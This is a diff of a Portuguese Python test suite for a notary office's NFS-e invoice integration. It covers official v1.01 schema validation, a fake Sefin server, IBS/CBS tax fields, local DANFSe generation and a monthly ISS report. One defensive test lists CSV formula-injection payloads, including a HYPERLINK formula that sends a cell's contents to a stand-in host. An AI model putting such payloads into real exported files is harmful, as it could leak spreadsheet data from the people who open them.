@@ -47,82 +47,37 @@ NS = {"n": DPS.NS, "ds": DPS.NS_DS}
 
 # --------------------------------------------------------------- o leiaute
 #
-# O MÍNIMO DO LEIAUTE DA DPS 1.00 QUE A CASA PREENCHE — ordem, obrigatórios
-# e formato. Não é o XSD oficial (ele não viaja com o sistema); é o bastante
-# para o servidor falso recusar o que a Sefin recusaria: grupo fora de ordem,
-# campo obrigatório ausente, dinheiro com vírgula, data sem fuso, documento
-# com dígito a mais e DPS sem assinatura.
-XSD_DA_DPS = f"""<?xml version="1.0" encoding="UTF-8"?>
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="{DPS.NS}"
-           xmlns="{DPS.NS}" elementFormDefault="qualified">
-  <xs:simpleType name="Doc11"><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{11}}"/></xs:restriction></xs:simpleType>
-  <xs:simpleType name="Doc14"><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{14}}"/></xs:restriction></xs:simpleType>
-  <xs:simpleType name="Mun"><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{7}}"/></xs:restriction></xs:simpleType>
-  <xs:simpleType name="Dinheiro"><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{1,13}}\\.[0-9]{{2}}"/></xs:restriction></xs:simpleType>
-  <xs:simpleType name="Texto"><xs:restriction base="xs:string"><xs:minLength value="1"/></xs:restriction></xs:simpleType>
-  <xs:simpleType name="DataHoraComFuso"><xs:restriction base="xs:dateTime">
-    <xs:pattern value=".+[+\\-][0-9]{{2}}:[0-9]{{2}}"/></xs:restriction></xs:simpleType>
-  <xs:complexType name="TEnd"><xs:sequence>
-    <xs:element name="endNac"><xs:complexType><xs:sequence>
-      <xs:element name="cMun" type="Mun"/>
-      <xs:element name="CEP"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{8}}"/></xs:restriction></xs:simpleType></xs:element>
-    </xs:sequence></xs:complexType></xs:element>
-    <xs:element name="xLgr" type="Texto"/><xs:element name="nro" type="Texto"/>
-    <xs:element name="xCpl" type="Texto" minOccurs="0"/><xs:element name="xBairro" type="Texto"/>
-  </xs:sequence></xs:complexType>
-  <xs:element name="DPS"><xs:complexType><xs:sequence>
-    <xs:element name="infDPS"><xs:complexType><xs:sequence>
-      <xs:element name="tpAmb"><xs:simpleType><xs:restriction base="xs:string"><xs:enumeration value="1"/><xs:enumeration value="2"/></xs:restriction></xs:simpleType></xs:element>
-      <xs:element name="dhEmi" type="DataHoraComFuso"/>
-      <xs:element name="verAplic" type="Texto"/>
-      <xs:element name="serie"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{1,5}}"/></xs:restriction></xs:simpleType></xs:element>
-      <xs:element name="nDPS"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[1-9][0-9]{{0,14}}"/></xs:restriction></xs:simpleType></xs:element>
-      <xs:element name="dCompet" type="xs:date"/>
-      <xs:element name="tpEmit"><xs:simpleType><xs:restriction base="xs:string"><xs:enumeration value="1"/></xs:restriction></xs:simpleType></xs:element>
-      <xs:element name="cLocEmi" type="Mun"/>
-      <xs:element name="prest"><xs:complexType><xs:sequence>
-        <xs:choice><xs:element name="CNPJ" type="Doc14"/><xs:element name="CPF" type="Doc11"/></xs:choice>
-        <xs:element name="IM" type="Texto" minOccurs="0"/>
-        <xs:element name="regTrib"><xs:complexType><xs:sequence>
-          <xs:element name="opSimpNac"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[1-3]"/></xs:restriction></xs:simpleType></xs:element>
-          <xs:element name="regEspTrib"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[0-6]"/></xs:restriction></xs:simpleType></xs:element>
-        </xs:sequence></xs:complexType></xs:element>
-      </xs:sequence></xs:complexType></xs:element>
-      <xs:element name="toma"><xs:complexType><xs:sequence>
-        <xs:choice><xs:element name="CNPJ" type="Doc14"/><xs:element name="CPF" type="Doc11"/></xs:choice>
-        <xs:element name="xNome" type="Texto"/>
-        <xs:element name="end" type="TEnd" minOccurs="0"/>
-        <xs:element name="email" type="Texto" minOccurs="0"/>
-      </xs:sequence></xs:complexType></xs:element>
-      <xs:element name="serv"><xs:complexType><xs:sequence>
-        <xs:element name="locPrest"><xs:complexType><xs:sequence><xs:element name="cLocPrestacao" type="Mun"/></xs:sequence></xs:complexType></xs:element>
-        <xs:element name="cServ"><xs:complexType><xs:sequence>
-          <xs:element name="cTribNac"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[0-9]{{6}}"/></xs:restriction></xs:simpleType></xs:element>
-          <xs:element name="cTribMun" type="Texto" minOccurs="0"/>
-          <xs:element name="xDescServ"><xs:simpleType><xs:restriction base="xs:string"><xs:minLength value="1"/><xs:maxLength value="2000"/></xs:restriction></xs:simpleType></xs:element>
-        </xs:sequence></xs:complexType></xs:element>
-      </xs:sequence></xs:complexType></xs:element>
-      <xs:element name="valores"><xs:complexType><xs:sequence>
-        <xs:element name="vServPrest"><xs:complexType><xs:sequence><xs:element name="vServ" type="Dinheiro"/></xs:sequence></xs:complexType></xs:element>
-        <xs:element name="trib"><xs:complexType><xs:sequence>
-          <xs:element name="tribMun"><xs:complexType><xs:sequence>
-            <xs:element name="tribISSQN"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[1-4]"/></xs:restriction></xs:simpleType></xs:element>
-            <xs:element name="tpRetISSQN"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[1-3]"/></xs:restriction></xs:simpleType></xs:element>
-            <xs:element name="pAliq" minOccurs="0"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="[0-9]\\.[0-9]{{2}}"/></xs:restriction></xs:simpleType></xs:element>
-          </xs:sequence></xs:complexType></xs:element>
-          <xs:element name="totTrib"><xs:complexType><xs:sequence><xs:element name="indTotTrib" type="xs:string"/></xs:sequence></xs:complexType></xs:element>
-        </xs:sequence></xs:complexType></xs:element>
-      </xs:sequence></xs:complexType></xs:element>
-    </xs:sequence>
-    <xs:attribute name="Id" use="required"><xs:simpleType><xs:restriction base="xs:string"><xs:pattern value="DPS[0-9]{{42}}"/></xs:restriction></xs:simpleType></xs:attribute>
-    </xs:complexType></xs:element>
-    <xs:any namespace="{DPS.NS_DS}" processContents="skip"/>
-  </xs:sequence>
-  <xs:attribute name="versao" type="xs:string" use="required" fixed="1.00"/>
-  </xs:complexType></xs:element>
-</xs:schema>"""
+# OS ESQUEMAS OFICIAIS DA VERSÃO 1.01 (NFSe-ESQUEMAS_XSD-v1.01-20260209,
+# gov.br/nfse), em `tests/xsd_nfse/v1.01`, sem uma vírgula mudada no arquivo.
+# Até 24/10/2026 havia aqui um XSD MÍNIMO escrito à mão, da versão 1.00 — e
+# ele aceitava o pedido de cancelamento que o esquema oficial recusa (o `Id`
+# com 62 caracteres e o `nPedRegEvento`): o teste aprovava o defeito porque
+# conferia contra a ideia que o código tinha do leiaute, e não contra ele.
+#
+# A ÚNICA ADAPTAÇÃO É NA LEITURA: o XSD oficial escreve 53 padrões com `^` e
+# `$` (`^0{0,4}\d{1,5}$`). Em XML Schema o padrão já casa a cadeia inteira, e
+# o libxml lê `^` e `$` como letras — recusaria toda série «1». Eles saem só
+# na cópia temporária que o teste carrega.
+PASTA_DOS_XSD = RAIZ / "tests" / "xsd_nfse" / "v1.01"
 
-LEIAUTE = etree.XMLSchema(etree.fromstring(XSD_DA_DPS.encode("utf-8")))
+
+def _esquemas() -> dict[str, etree.XMLSchema]:
+    import tempfile
+    with tempfile.TemporaryDirectory(prefix="cg_xsd_nfse_") as nome_da_pasta:
+        pasta = Path(nome_da_pasta)
+        for arquivo in PASTA_DOS_XSD.glob("*.xsd"):
+            texto = arquivo.read_text(encoding="utf-8")
+            texto = re.sub(r'(<xs:pattern value=")\^(.*?)\$(")', r"\1\2\3", texto)
+            (pasta / arquivo.name).write_text(texto, encoding="utf-8")
+        # O esquema carregado guarda tudo o que leu: a pasta pode sumir depois.
+        return {nome: etree.XMLSchema(etree.parse(str(pasta / arquivo)))
+                for nome, arquivo in (("dps", "DPS_v1.01.xsd"), ("nfse", "NFSe_v1.01.xsd"),
+                                      ("evento", "pedRegEvento_v1.01.xsd"))}
+
+
+ESQUEMAS = _esquemas()
+LEIAUTE = ESQUEMAS["dps"]
+LEIAUTE_DO_EVENTO = ESQUEMAS["evento"]
 
 
 def _assinatura_confere(raiz) -> bool:
@@ -152,6 +107,66 @@ def _assinatura_confere(raiz) -> bool:
     except InvalidSignature:
         return False
     return True
+
+
+def _nfse_falsa(dps, chave: str, numero: int) -> bytes:
+    """A NFS-e 1.01 que a Sefin devolveria em volta da DPS — sem a assinatura dela.
+
+    Os valores do ISS e do IBS/CBS são os de uma nota de R$ 105,63 a 5%, com a
+    alíquota-teste de 2026 (CBS 0,9% e IBS UF 0,1%). Ela passa no esquema
+    oficial da NFS-e em tudo menos na `Signature`, que é da Sefin.
+    """
+    def sub(pai, nome, texto=None):
+        el = etree.SubElement(pai, f"{{{DPS.NS}}}{nome}")
+        if texto is not None:
+            el.text = texto
+        return el
+    raiz = etree.Element(f"{{{DPS.NS}}}NFSe", nsmap={None: DPS.NS})
+    raiz.set("versao", "1.01")
+    inf = sub(raiz, "infNFSe")
+    inf.set("Id", f"NFS{chave}")
+    for nome, valor in (("xLocEmi", "Municipio Ficticio"), ("xLocPrestacao", "Municipio Ficticio"),
+                        ("nNFSe", str(numero)), ("cLocIncid", MUNICIPIO),
+                        ("xLocIncid", "Municipio Ficticio"),
+                        ("xTribNac", "Serviços de registros públicos, cartorários e notariais."),
+                        ("verAplic", "SefinFalsa_1.01"), ("ambGer", "2"), ("tpEmis", "1"),
+                        ("procEmi", "1"), ("cStat", "100"),
+                        ("dhProc", "2026-10-24T10:00:05-03:00"), ("nDFSe", str(numero))):
+        sub(inf, nome, valor)
+    emit = sub(inf, "emit")
+    sub(emit, "CNPJ", PRESTADOR)
+    sub(emit, "xNome", "SERVENTIA FICTICIA")
+    end = sub(emit, "enderNac")
+    for nome, valor in (("xLgr", "RUA FICTICIA"), ("nro", "1"), ("xBairro", "CENTRO"),
+                        ("cMun", MUNICIPIO), ("UF", "MA"), ("CEP", "65000000")):
+        sub(end, nome, valor)
+    servico = dps.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS)
+    iss = f"{round(float(servico) * 5) / 100:.2f}"
+    val = sub(inf, "valores")
+    for nome, valor in (("vBC", servico), ("pAliqAplic", "5.00"), ("vISSQN", iss),
+                        ("vTotalRet", "0.00"), ("vLiq", servico)):
+        sub(val, nome, valor)
+    if dps.find("n:infDPS/n:IBSCBS", NS) is not None:
+        ib = sub(inf, "IBSCBS")
+        sub(ib, "cLocalidadeIncid", MUNICIPIO)
+        sub(ib, "xLocalidadeIncid", "Municipio Ficticio")
+        v = sub(ib, "valores")
+        sub(v, "vBC", servico)
+        for grupo, campos in (("uf", (("pIBSUF", "0.10"), ("pAliqEfetUF", "0.10"))),
+                              ("mun", (("pIBSMun", "0.00"), ("pAliqEfetMun", "0.00"))),
+                              ("fed", (("pCBS", "0.90"), ("pAliqEfetCBS", "0.90")))):
+            g = sub(v, grupo)
+            for nome, valor in campos:
+                sub(g, nome, valor)
+        tot = sub(ib, "totCIBS")
+        sub(tot, "vTotNF", f"{float(servico) + 0.12 + 1.08:.2f}")
+        gibs = sub(tot, "gIBS")
+        sub(gibs, "vIBSTot", "0.12")
+        sub(sub(gibs, "gIBSUFTot"), "vIBSUF", "0.12")
+        sub(sub(gibs, "gIBSMunTot"), "vIBSMun", "0.00")
+        sub(sub(tot, "gCBS"), "vCBS", "1.08")
+    inf.append(etree.fromstring(etree.tostring(dps)))
+    return etree.tostring(raiz, xml_declaration=True, encoding="UTF-8")
 
 
 class SefinFalsa:
@@ -194,9 +209,12 @@ class SefinFalsa:
                                        "nfseXmlGZipB64": PROV.comprimir(nota["xml"])})
         if achado and metodo == "POST":
             return self._cancelar(achado.group(1), corpo)
-        achado = re.match(r"/danfse/(\d{50})$", caminho)
-        if achado:
-            return PROV.Resposta(200, b"%PDF-1.4 danfse ficticio " + achado.group(1).encode())
+        achado = re.match(r"/SefinNacional/parametros_municipais/(\d{7})/(\w+)$", caminho)
+        if achado and metodo == "GET":
+            return PROV.Resposta(200, {"municipio": achado.group(1),
+                                       "consulta": achado.group(2), "ficticio": True})
+        # O DANFSe do ADN foi suspenso em 1º/07/2026 (NT 008): a casa não
+        # pode mais pedi-lo, e o servidor falso responde como se não existisse.
         return PROV.Resposta(404, {})
 
     def _emitir(self, corpo) -> PROV.Resposta:
@@ -219,8 +237,7 @@ class SefinFalsa:
         numero = len(self._agora) + 1
         tp_amb = raiz.findtext("n:infDPS/n:tpAmb", namespaces=NS)
         chave = f"{MUNICIPIO}{tp_amb}{numero:042d}"
-        nfse = (f'<NFSe xmlns="{DPS.NS}" versao="1.00"><infNFSe Id="NFS{chave}">'
-                f"<nNFSe>{numero}</nNFSe></infNFSe></NFSe>").encode("utf-8")
+        nfse = _nfse_falsa(raiz, chave, numero)
         self._agora[ident] = {"chave": chave, "numero": numero, "xml": nfse, "dps": raiz}
         if self.perder_a_resposta:
             self.perder_a_resposta = False
@@ -231,6 +248,9 @@ class SefinFalsa:
     def _cancelar(self, chave: str, corpo) -> PROV.Resposta:
         raiz = etree.fromstring(gzip.decompress(base64.b64decode(
             corpo["pedidoRegistroEventoXmlGZipB64"])))
+        if not LEIAUTE_DO_EVENTO.validate(raiz):
+            return PROV.Resposta(400, {"erros": [{"Codigo": "E1235", "Descricao":
+                                                  str(LEIAUTE_DO_EVENTO.error_log.last_error)}]})
         if not _assinatura_confere(raiz):
             return PROV.Resposta(400, {"erros": [{"Codigo": "E0714",
                                                   "Descricao": "Assinatura inválida"}]})
@@ -288,6 +308,7 @@ CONFIG_LIGADA = {
     "nfse_inscricao_municipal": "12345", "nfse_codigo_tributacao": "210101",
     "nfse_aliquota": "5,00", "nfse_optante_simples": "1", "nfse_regime_especial": "4",
     "nfse_serie": "1", "nfse_exige_endereco": "1",
+    "nfse_ibscbs_cst": "000", "nfse_ibscbs_classificacao": "000001",
 }
 
 
@@ -402,7 +423,9 @@ def test_senha_errada_do_a1_nao_abre_e_a_frase_nao_traz_a_senha(pfx):
 
 # ---------------------------------------------------- a base e a pendência
 
-def test_a_base_do_iss_e_o_emolumento_e_os_fundos_ficam_fora_da_nota(casa):
+def test_a_base_e_o_emolumento_menos_o_ferj_e_os_fundos_ficam_fora_da_nota(casa):
+    """No Maranhão, a base é o emolumento menos o FERJ de 12% (LC 48/2000, art. 3º, V);
+    o FERC (3%) é cobrado por cima e NÃO se desconta (o oficial, 25/10/2026)."""
     db = casa["db"]
     rid = _recibo(db, numero=101)
     _endereco(db)
@@ -410,12 +433,13 @@ def test_a_base_do_iss_e_o_emolumento_e_os_fundos_ficam_fora_da_nota(casa):
     assert resposta.status_code == 200
     nota = _nota_do_recibo(db, rid)
     assert nota["situacao"] == NFSE.EMITIDA, nota["mensagem"]
-    assert nota["valor_servico"] == 12003          # R$ 120,03, e não os 134,43
-    assert nota["valor_iss"] == 600                # 5% de 120,03 = 6,0015 → 6,00
+    assert nota["valor_servico"] == 10563          # 120,03 − 14,40 (12% de FERJ); não os 134,43
+    assert nota["valor_iss"] == 528                # 5% de 105,63 = 5,2815 → 5,28
     dps = casa["sefin"].emitidas[nota["id_dps"]]["dps"]
-    assert dps.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS) == "120.03"
+    assert dps.findtext("n:infDPS/n:valores/n:vServPrest/n:vServ", namespaces=NS) == "105.63"
     descricao = dps.findtext("n:infDPS/n:serv/n:cServ/n:xDescServ", namespaces=NS)
-    assert "R$ 14,40" in descricao and "não integram o preço" in descricao
+    assert "R$ 28,80" in descricao and "emolumento menos o FERJ" in descricao
+    assert NFSE.ferj_do_emolumento(12003, 1200) == 1440   # e o FERC de 3,60 não entra
     assert "TOMADORA" not in descricao             # a descrição não leva o nome
 
 
@@ -516,8 +540,10 @@ def test_na_producao_o_numero_e_a_chave_vao_ao_recibo_e_a_nota_de_teste_nao_impe
     assert casa["sefin"].chamadas[-1][1].startswith("https://sefin.nfse.gov.br/")
     # e a DPS de teste que ficou para trás não vai à produção
     with pytest.raises(NFSE.NfseError, match="homologacao"):
-        NFSE.danfse(db, notas[0]["id"], NFSE.provedor_da_casa(
-            _cfg(db), NFSE.ler_certificado()), usuario="teste")
+        NFSE.cancelar(db, notas[0]["id"], provedor=NFSE.provedor_da_casa(
+            _cfg(db), NFSE.ler_certificado()), certificado=NFSE.ler_certificado(),
+            cfg=_cfg(db), motivo="1", justificativa="Teste da troca de ambiente",
+            usuario="teste")
 
 
 def test_clicar_duas_vezes_nao_emite_duas_notas(casa):
@@ -732,19 +758,192 @@ def test_resposta_que_chega_depois_do_cancelamento_e_da_nota_nova_avisa_sem_esto
     assert rastro[-1]["resultado"] == "alerta" and chave in rastro[-1]["mensagem"]
 
 
-def test_danfse_baixa_uma_vez_e_a_segunda_via_sai_do_banco(casa):
+def test_danfse_sai_do_xml_da_nota_sem_rede_e_sem_a_api_suspensa(casa, monkeypatch):
+    """NT 008/2026: a API do DANFSe do ADN parou em 1º/07/2026; o papel é da casa."""
+    import impressao_pdf
+    paginas = []
+    monkeypatch.setattr(impressao_pdf, "pdf_de_html_chrome",
+                        lambda html, **_k: paginas.append(html) or b"%PDF-1.7 ficticio")
     db = casa["db"]
     rid = _recibo(db, numero=131)
     _endereco(db)
     _emitir(casa, rid)
     nota = _nota_do_recibo(db, rid)
-    c = casa["c"]
-    primeira = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse")
-    assert primeira.status_code == 200 and primeira.data.startswith(b"%PDF-")
     casa["sefin"].fora_do_ar = True
-    segunda = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse")
-    assert segunda.status_code == 200 and segunda.data == primeira.data
-    assert sum(1 for _m, u in casa["sefin"].chamadas if "/danfse/" in u) == 1
+    c = casa["c"]
+    pdf = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse")
+    assert pdf.status_code == 200 and pdf.data.startswith(b"%PDF-")
+    folha = c.get(f"/caixa/nfse/nota/{nota['id']}/danfse?formato=html").get_data(as_text=True)
+    assert paginas and "DANFSe v2.0" in paginas[0]
+    for esperado in ("DANFSe v2.0", "Documento Auxiliar da NFS-e", nota["chave"],
+                     "NFS-e SEM VALIDADE JURÍDICA",            # homologação (item 2.4.3)
+                     "Notário ou Registrador", "R$ 5,28",       # ISS que a Sefin apurou
+                     "000 / 000001", "1.1304.00.00",
+                     "O DESTINATÁRIO É O PRÓPRIO TOMADOR/ADQUIRENTE DA OPERAÇÃO",
+                     "Totais Aproximados dos Tributos cfe. Lei nº 12.741/2012",
+                     'class="qr" src="data:image/svg+xml'):
+        assert esperado in folha, esperado
+    assert "CANCELADA" not in folha
+    import nfse_danfse
+    assert nfse_danfse.dados(nota["xml_nfse"])["url_consulta"] == (
+        "https://www.nfse.gov.br/ConsultaPublica/?tpc=1&chave=" + nota["chave"])
+    assert not [u for _m, u in casa["sefin"].chamadas if "danfse" in u]
+
+
+def test_danfse_da_nota_cancelada_leva_a_marca_dagua(casa):
+    db = casa["db"]
+    rid = _recibo(db, numero=132)
+    _endereco(db)
+    _emitir(casa, rid)
+    nota = _nota_do_recibo(db, rid)
+    NFSE.cancelar(db, nota["id"], provedor=NFSE.provedor_da_casa(_cfg(db), NFSE.ler_certificado()),
+                  certificado=NFSE.ler_certificado(), cfg=_cfg(db), motivo="1",
+                  justificativa="Erro de digitação no valor", usuario="teste")
+    folha = NFSE.danfse(db, nota["id"], usuario="teste", formato="html")
+    assert '<div class="marca"><span>CANCELADA</span></div>' in folha
+
+
+# ------------------------------------------------- leiaute 1.01 e reforma
+
+def _chave_ficticia() -> str:
+    return f"{MUNICIPIO}2{1:042d}"
+
+
+def test_cancelamento_passa_no_esquema_oficial_e_o_id_tem_59_caracteres(pfx):
+    """O `Id` levava um número de pedido (62) e o XML um `nPedRegEvento`; o XSD recusa os dois."""
+    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
+    xml = DPS.assinar(DPS.montar_cancelamento(
+        ambiente="homologacao", quando=datetime(2026, 10, 24, 10, 0, tzinfo=timezone(
+            timedelta(hours=-3))), autor=PRESTADOR, chave=_chave_ficticia(), motivo="1",
+        justificativa="Erro na emissão de teste"), cert)
+    raiz = etree.fromstring(xml)
+    assert LEIAUTE_DO_EVENTO.validate(raiz), LEIAUTE_DO_EVENTO.error_log
+    assert raiz.get("versao") == "1.01"
+    assert raiz[0].get("Id") == f"PRE{_chave_ficticia()}101101"
+    assert raiz.find("n:infPedReg/n:nPedRegEvento", NS) is None
+
+
+def test_dps_com_nbs_e_ibscbs_passa_no_esquema_oficial(pfx):
+    cert = DPS.abrir_pfx(pfx, SENHA_DO_A1)
+    xml = DPS.assinar(DPS.montar_dps(
+        ambiente="homologacao", emitida_em=datetime(2026, 10, 24, 10, 0, tzinfo=timezone(
+            timedelta(hours=-3))), serie="1", numero=8,
+        prestador=DPS.Prestador(PRESTADOR, "12345", MUNICIPIO),
+        tomador=DPS.Tomador(TOMADOR, "TOMADORA FICTICIA", "65000000", MUNICIPIO,
+                            "RUA FICTICIA", "10", "", "CENTRO"),
+        servico=DPS.Servico("210101", "Emolumentos", 12003, "", "001", "113040000"),
+        ibscbs=DPS.IbsCbs(cst="000", classificacao="000001", indicador_operacao="100301")),
+        cert)
+    raiz = etree.fromstring(xml)
+    assert LEIAUTE.validate(raiz), LEIAUTE.error_log
+    assert raiz.findtext("n:infDPS/n:serv/n:cServ/n:cNBS", namespaces=NS) == "113040000"
+    assert raiz.findtext("n:infDPS/n:IBSCBS/n:valores/n:trib/n:gIBSCBS/n:cClassTrib",
+                         namespaces=NS) == "000001"
+    assert raiz.find("n:infDPS/n:valores/n:trib/n:tribMun/n:pAliq", NS) is None
+
+
+@pytest.mark.parametrize("grupo, frase", [
+    (DPS.IbsCbs("000", "200001", "100301"), "não pertence ao CST"),
+    (DPS.IbsCbs("00", "000001", "100301"), "3 dígitos"),
+    (DPS.IbsCbs("000", "000001", "1003"), "Anexo C"),
+    (DPS.IbsCbs("000", "000001", "100301", destinatario="1"), "Destinatário"),
+])
+def test_classificacao_do_ibscbs_fora_da_forma_e_recusada_antes_da_rede(grupo, frase):
+    with pytest.raises(DPS.DpsError, match=frase):
+        DPS.conferir_ibscbs(grupo)
+
+
+def test_com_convenio_ativo_e_fora_do_simples_a_aliquota_nao_vai_na_nota():
+    """Regra E0617 do Anexo I v1.01."""
+    base = {"nfse_aliquota": "5,00", "nfse_optante_simples": "1"}
+    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "1"}) == ""
+    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "0"}) == "5,00"
+    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": ""}) == "5,00"
+    assert NFSE.aliquota_para_a_dps({**base, "nfse_convenio_ativo": "1",
+                                     "nfse_optante_simples": "3"}) == "5,00"
+
+
+def test_a_nota_emitida_leva_o_grupo_do_ibscbs_configurado(casa):
+    db = casa["db"]
+    rid = _recibo(db, numero=133)
+    _endereco(db)
+    _emitir(casa, rid)
+    nota = _nota_do_recibo(db, rid)
+    raiz = etree.fromstring(nota["xml_dps"].encode("utf-8"))
+    assert raiz.findtext("n:infDPS/n:IBSCBS/n:cIndOp", namespaces=NS) == "100301"
+    assert raiz.findtext("n:infDPS/n:serv/n:cServ/n:cNBS", namespaces=NS) == "113040000"
+    sem = {**CONFIG_LIGADA, "nfse_ibscbs_cst": "", "nfse_ibscbs_classificacao": ""}
+    assert any("IBS/CBS" in a for a in NFSE.avisos_da_configuracao(sem))
+    with pytest.raises(NFSE.NfseError, match="CST"):
+        NFSE.conferir_configuracao({**CONFIG_LIGADA, "nfse_ibscbs_classificacao": "200001"})
+
+
+def test_apuracao_do_mes_soma_o_iss_que_a_sefin_apurou_e_deixa_a_cancelada_de_fora(casa):
+    db = casa["db"]
+    _endereco(db)
+    for numero in (134, 135):
+        _emitir(casa, _recibo(db, numero=numero))
+    with db.connect() as con:
+        notas = banco(con).ler("SELECT id, xml_dps FROM nfse_notas ORDER BY id")
+    mes = etree.fromstring(notas[0]["xml_dps"].encode("utf-8")).findtext(
+        "n:infDPS/n:dCompet", namespaces=NS)[:7]
+    NFSE.cancelar(db, notas[-1]["id"], provedor=NFSE.provedor_da_casa(
+        _cfg(db), NFSE.ler_certificado()), certificado=NFSE.ler_certificado(), cfg=_cfg(db),
+        motivo="2", justificativa="Serviço não prestado no teste", usuario="teste")
+    with db.connect() as con:
+        a = NFSE.apuracao_do_mes(con, mes, ambiente="homologacao")
+    assert a["quantidade"] == len(notas) - 1 and len(a["canceladas"]) == 1
+    assert all(not n["estimado"] for n in a["notas"])
+    assert a["total"]["iss"] == sum(n["iss"] for n in a["notas"]) > 0
+    csv = casa["c"].get(f"/caixa/nfse/apuracao?mes={mes}&ambiente=homologacao&formato=csv")
+    assert csv.status_code == 200 and b"TOTAL" in csv.data
+    tela = casa["c"].get(f"/caixa/nfse/apuracao?mes={mes}&ambiente=homologacao")
+    assert tela.status_code == 200 and "guia do ISS não sai daqui" in tela.get_data(as_text=True)
+
+
+def test_o_csv_da_apuracao_desarma_a_formula_no_nome_do_tomador():
+    """Revisão de segurança de 26/10/2026: o nome do tomador vem do cadastro
+    do cliente, digitado no balcão; no CSV que o contador abre no Excel, um
+    nome que começa com «=», «+», «-» ou «@» viraria fórmula. Ele tem de sair
+    com o apóstrofo na frente, entre aspas, e o «;» dentro dele não pode
+    deslocar as colunas."""
+    import csv
+    import io
+    perigosos = ['=HYPERLINK("http://x/?"&A1;"ver")', "+1+1", "-2+3", "@SUM(A1:A2)",
+                 "\t=1+1", "MARIO; DA SILVA"]
+    nota = {"competencia": "2026-10-01", "numero": "1", "dps": "1/1", "chave": "=CHAVE",
+            "tomador_documento": "***.000.002-**", "base": 10000, "aliquota": "2.00",
+            "iss": 200, "estimado": False, "ibs": 0, "cbs": 0}
+    apuracao = {"notas": [{**nota, "tomador": nome} for nome in perigosos],
+                "total": {"base": 60000, "iss": 1200, "estimadas": 0, "ibs": 0, "cbs": 0}}
+    import csv_seguro as CSVS
+    texto = CSVS.gerar(NFSE.CABECALHO_DA_APURACAO, NFSE.linhas_da_apuracao(apuracao))
+    linhas = list(csv.reader(io.StringIO(texto), delimiter=";"))
+    assert len(linhas) == 2 + len(perigosos)
+    assert all(len(linha) == 12 for linha in linhas)
+    corpo = linhas[1:-1]
+    assert [linha[4] for linha in corpo] == ["'" + perigosos[0], "'+1+1", "'-2+3",
+                                             "'@SUM(A1:A2)", "'\t=1+1", "MARIO; DA SILVA"]
+    assert all(linha[3] == "'=CHAVE" for linha in corpo)
+    # nenhuma célula de texto começa como fórmula; os valores continuam números
+    for linha in corpo:
+        assert not any(c.startswith(("=", "+", "@", "\t", "\r")) for c in linha)
+        assert linha[6] == "100,00" and linha[8] == "2,00"
+    # QUOTE_ALL: toda célula sai entre aspas no arquivo
+    assert texto.splitlines()[0].startswith('"competencia";"numero_nfse"')
+    assert linhas[-1][0] == "TOTAL"
+
+
+def test_parametros_do_municipio_sao_consultados_e_mostrados_como_vieram(casa):
+    c = casa["c"]
+    r = c.post("/administrativo/gestor/nfse", data={"csrf_token": _token(c),
+                                                    "acao": "parametros"},
+               follow_redirects=True)
+    html = r.get_data(as_text=True)
+    assert r.status_code == 200 and "convenio" in html and MUNICIPIO in html
+    caminhos = [u for _m, u in casa["sefin"].chamadas if "parametros_municipais" in u]
+    assert any(u.endswith(f"/{MUNICIPIO}/convenio") for u in caminhos)
+    assert any(u.endswith(f"/{MUNICIPIO}/210101") for u in caminhos)
 
 
 # ------------------------------------------- desligada, papéis e segredo
